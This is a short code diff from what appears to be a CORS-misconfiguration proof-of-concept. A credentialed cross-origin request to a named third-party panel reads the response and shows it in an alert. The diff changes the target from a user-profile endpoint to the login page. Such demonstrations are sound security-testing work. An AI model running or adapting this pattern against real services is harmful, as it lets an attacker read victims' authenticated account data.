@@ -16,7 +16,7 @@ function cors() {
       document.getElementById("demo").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("GET", "https://panel.sendcloud.sc/xhr/users/me", true);
+  xhttp.open("GET", "https://panel.sendcloud.sc/accounts/login/?next=/", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
